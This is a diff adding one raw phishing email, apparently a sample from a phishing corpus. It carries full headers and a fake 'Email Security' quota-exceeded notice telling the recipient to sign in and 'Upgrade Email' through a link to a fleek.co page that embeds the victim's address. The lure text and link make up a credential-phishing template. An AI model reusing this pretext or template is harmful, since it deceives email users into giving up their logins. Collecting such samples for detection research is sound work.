@@ -1,0 +1,354 @@
+From jose@monkey.org Mon May  8 13:35:32 2023 +0000
+Return-Path: lena@touchofoils.com
+Delivered-To: jose@monkey.org
+X-FDA: 80767184904.27.740B330
+Received: from michelle.touchofoils.com (michelle.touchofoils.com [45.14.9.189])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id D49FD160005
+	for <jose@monkey.org>; Mon,  8 May 2023 13:35:30 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=pass header.d=touchofoils.com header.s=dkim header.b=hatWz2Ci;
+	spf=pass (imf08.b.hostedemail.com: domain of lena@touchofoils.com designates 45.14.9.189 as permitted sender) smtp.mailfrom=lena@touchofoils.com;
+	dmarc=pass (policy=none) header.from=touchofoils.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683552931; a=rsa-sha256;
+	cv=none;
+	b=pdt3G+hp5RTW+oRDofOA12XDIod8cLYscHGklMu5DIhu6KysC03tw3iWfe/U5E1F3/UmU6
+	a7m/KCskwRLNMnPCJ2/V3nkJDkp4yihX0gj0/x2P+xlsd8U06XOf2SahCOfa6FcZEtFUsZ
+	JO5jrT4V9/yG6dhlm7cekqY+oARuw6w=
+ARC-Authentication-Results: i=1;
+	imf08.b.hostedemail.com;
+	dkim=pass header.d=touchofoils.com header.s=dkim header.b=hatWz2Ci;
+	spf=pass (imf08.b.hostedemail.com: domain of lena@touchofoils.com designates 45.14.9.189 as permitted sender) smtp.mailfrom=lena@touchofoils.com;
+	dmarc=pass (policy=none) header.from=touchofoils.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683552931;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=V8ny/O9I9rj6Jol1KKEHyMj3IrfbY4a7pPFXNuzYvtQ=;
+	b=CSfd/ceEMARBVTmQGbozJWXdBJ8XsgwKeM/WR0Z0DpK4TBL+E3D0J7gcknQW0k7vYB8x0T
+	zFLLMnnKeftW8jPZhSYVkT8uUokALDmBncg2OmYcKNIesYjSiFmbniYIxNVegDVMCW6dmZ
+	Eq64TQ6XnR8kWeDIgNTqxNxT2ybA5oA=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=touchofoils.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=lena@touchofoils.com;
+ bh=27m9Yg0gIBPxzCTmKejeOIfiGvM=;
+ b=hatWz2CiKr1BrHaPld6p57WpQe9TG2O7L5t75JL8Y9e9eAZPm3YuMa0+kQbwwcWJkzkpUih4B5/0
+   QtuI5hHjKuE9FaNAA+XXz7fPpVCuiklfqWMv3GEi3vyj+C81zYYT9l6DvirHt7tjmhFYXETNruKp
+   +wyZKmU5oSrDjTG965yTvcngakU/ss2T6SHF3iGrlt8AfOKZJqiW+Ocdi/Ptbt/GSYRlJ1hj0bvp
+   g+WN5pbznUnVkpgtrWKoJZsJ8EAsSxbtEZ6AwqQpvQb7RSz9GmkB1mhYzmECmzEfyswqjQKgNArI
+   KFW1ot7exJjVA6oi4W6+0+3WFnFm1i4bKblMsw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=touchofoils.com;
+ b=JZqh2A8ol6hQJD/t2fKjA1E061VII0PffU6T0BPxNXskF7OCvLNnAtC0AVaj4VRsAPF10693/TeT
+   6BBN5VAKk+ID0HUECjbeANX5GDKWXxHPQCNbuusjoHbpxJy9k+Ma5P0J8XXYT2JN1hGoTwKUEVd0
+   HVugonlh8sYuojiLroPJ+Eq3hJ9HAW9bJoKVmgbBmWE5mGxygrEY0vg8j/4xm1yuDXQ7ko79qQrI
+   1zJsKx+Rp0iFGDJB1ZTOYS/djcip2y2gbonHpvEzC/1wkRGP9cif8gWoB1yE5vjO75tB6s6udCZA
+   fMkUBfG/c9mKg7z6cFaNgf74z9AnTktKFNJ0Hw==;
+From: "Email Security"<lena@touchofoils.com>
+To: jose@monkey.org
+Subject: Email Quota Reached
+Date: 8 May 2023 06:35:29 -0700
+Message-ID: <20230508063528.33503ADE96CAB697@touchofoils.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: D49FD160005
+X-Rspam-User: 
+X-Spam-Status: No, score=7.20
+X-Stat-Signature: yu8gtzkeowjkd4gbs11whcishzd5p8jf
+X-HE-Tag: 1683552930-61093
+X-HE-Meta: U2FsdGVkX1+ImPMadu0HZs34TrIn7WTmjuturguDQAP2j0KuvgU+9wBRkSUeoXui6k5DN8OnWJn8s67dnpzMyw+7XJ0NRysxr/G9mYEuCOfcmK1TVPTs0y0RMQQVsVri2+kvnhh371MiNdq2Vd5/SyQAexhvHX0ILrnk//K8uVmVAL7Creze4WncYDfCMnTIJd3aSGNvkgQ6Oh4ksJCrV4vcZ9kYy+FXpJrOr1y9BhQ=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 96
+
+<table style=3D"min-width: 100%" width=3D"100%">
+    <tbody>
+        <tr>
+            <td style=3D"
+          padding-bottom: 0px;
+          padding-left: 0px;
+          padding-right: 0px;
+          padding-top: 0px;
+        " valign=3D"top">
+                <table style=3D"min-width: 100%" width=3D"100%">
+                    <tbody>
+                        <tr>
+                            <td style=3D"padding-top: 9px" valign=3D"top">
+                                <table style=3D"min-width: 100%; max-width:=
+ 100%" width=3D"100%" align=3D"left">
+                                    <tbody>
+                                        <tr>
+                                            <td style=3D"
+                          padding-bottom: 9px;
+                          padding-left: 18px;
+                          padding-right: 18px;
+                          padding-top: 0px;
+                        " valign=3D"top">
+                                                <h1>
+                                                    <span style=3D"font-siz=
+e: 16px"><u><strong>Notice to
+                                                                <a>jose@mon=
+key.org</a>,</strong></u></span><br />&nbsp;
+                                                </h1>
+                                                <span style=3D"font-size: 1=
+2px">Your Email is running out of space and will soon stop receiving incomi=
+ng emails.</span><br /><span
+                                                    style=3D"font-size: 12p=
+x"> <br /><br />Upgrade your Email to keep receiving emails. The following
+                                                    features are now availa=
+ble with Email Upgrade!</span>
+                                                <ul>
+                                                    <li>
+                                                        <strong><span style=
+=3D"font-size: 12px">&nbsp;Increased Document Upload
+                                                                Speed</span=
+></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style=
+=3D"font-size: 12px">&nbsp;Calendar
+                                                                Feeds</span=
+></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style=
+=3D"font-size: 12px">&nbsp;Upgraded Antivirus
+                                                                Software</s=
+pan></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style=
+=3D"font-size: 12px">&nbsp;Integrated
+                                                                Webmail/Mob=
+ile Chat</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style=
+=3D"font-size: 12px">&nbsp;Webmail Speed
+                                                                Improvement=
+s</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style=
+=3D"font-size: 12px">&nbsp;SNI support for SSL
+                                                                certificate=
+</span></strong>
+                                                    </li>
+                                                </ul>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table style=3D"min-width: 100%" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%">
+                    <tbody>
+                        <tr>
+                            <td style=3D"padding-top: 9px" valign=3D"top">
+                                <table style=3D"min-width: 100%; max-width:=
+ 100%" width=3D"100%" align=3D"left">
+                                    <tbody>
+                                        <tr>
+                                            <td style=3D"
+                          padding-bottom: 9px;
+                          padding-left: 18px;
+                          padding-right: 18px;
+                          padding-top: 0px;
+                        " valign=3D"top">
+                                                <span style=3D"font-size: 1=
+4px"><u><strong>what should you
+                                                            do?</strong></u=
+></span><br /><br /><span
+                                                    style=3D"font-size: 12p=
+x">Please Sign-In and upgrade your account=20
+                                                     to enable the new feat=
+ures and increase Email Quota.</span>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table style=3D"min-width: 100%" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%">
+                    <tbody>
+                        <tr>
+                            <td style=3D"
+                  padding-bottom: 18px;
+                  padding-left: 18px;
+                  padding-right: 18px;
+                  padding-top: 0px;
+                " valign=3D"top" align=3D"middle">
+                                <table style=3D"
+                    background-color: #0b348b;
+                    border-collapse: separate !important;
+                    border-radius: 5px;
+                  " border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=
+=3D"100%">
+                                    <tbody>
+                                        <tr>
+                                            <td style=3D"
+                          padding-bottom: 13px;
+                          padding-left: 13px;
+                          padding-right: 13px;
+                          font-family: arial;
+                          font-size: 12px;
+                          padding-top: 13px;
+                        " valign=3D"center" align=3D"middle">
+                                                <a=20
+                            href=3D"https://unbox-update-8708.on.fleek.co/?=
+bic=3Dxmsjckgrwhw&email=3Djose@monkey.org"
+                            style=3D"
+                            text-align: center;
+                            line-height: 100%;
+                            letter-spacing: normal;
+                            color: #ffffff;
+                            font-weight: normal;
+                            text-decoration: none;
+                          ">Upgrade Email</a>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table style=3D"min-width: 100%" width=3D"100%">
+                    <tbody>
+                        <tr>
+                            <td style=3D"
+                  margin: 0px;
+                  padding: 10px 15px 10px;
+                  color: rgb(0, 0, 0);
+                  font-size: 13px;
+                " bgcolor=3D"#f0f0f0">
+                                <table width=3D"100%" style=3D"
+                    margin: 0px;
+                    padding: 0px;
+                    width: 550px;
+                    border-collapse: collapse;
+                  " border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                                    <tbody>
+                                        <tr>
+                                            <td id=3D"m_-123290354455892517=
+2m_1815785236998846257m_3951225256807228058templatefooter"
+                                                valign=3D"top">
+                                                <table border=3D"0" cellspa=
+cing=3D"0" cellpadding=3D"0" width=3D"100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td valign=3D"t=
+op">
+                                                                <table bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0"
+                                                                    width=
+=3D"100%" align=3D"left">
+                                                                    <tbody>=
+
+                                                                        <tr=
+>
+                                                                           =
+ <td valign=3D"top">
+                                                                           =
+     <div style=3D"text-align: center">
+                                                                           =
+         <span style=3D"font-size: 11px"><em>copyright
+                                                                           =
+                 =C2=A92023
+                                                                           =
+                 <strong>jose@monkey.org</strong>
+                                                                           =
+                 all rights
+                                                                           =
+                 reserved.</em></span>
+                                                                           =
+         <p style=3D"text-align: center">
+                                                                           =
+             <span
+                                                                           =
+                 style=3D"font-size: 11px"><em>please
+                                                                           =
+                     do not reply to this
+                                                                           =
+                     email.
+                                                                           =
+                     </em></span>
+                                                                           =
+         </p>
+                                                                           =
+         <p style=3D"text-align: center">
+                                                                           =
+             <span
+                                                                           =
+                 style=3D"font-size: 11px"><em>We
+                                                                           =
+                     are unable to respond to
+                                                                           =
+                     enquiries sent to this
+                                                                           =
+                     address.</em>
+                                                                           =
+             </span>
+                                                                           =
+         </p>
+                                                                           =
+         <p style=3D"text-align: center">
+                                                                           =
+             <span
+                                                                           =
+                 style=3D"font-size: 11px"><em>For
+                                                                           =
+                     more enquiries, visit
+                                                                           =
+                     <a>Help
+                                                                           =
+                         Center</a></em></span>
+                                                                           =
+         </p>
+                                                                           =
+         <p style=3D"text-align: center">
+                                                                           =
+             <span
+                                                                           =
+                 style=3D"font-size: 11px"><em>we
+                                                                           =
+                     hope to serve you
+                                                                           =
+                     better.</em></span>
+                                                                           =
+         </p>
+                                                                           =
+     </div>
+                                                                           =
+ </td>
+                                                                        </t=
+r>
+                                                                    </tbody=
+>
+                                                                </table>
+                                                                <font color=
+=3D"#888888"> </font>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+    </tbody>
+</table>
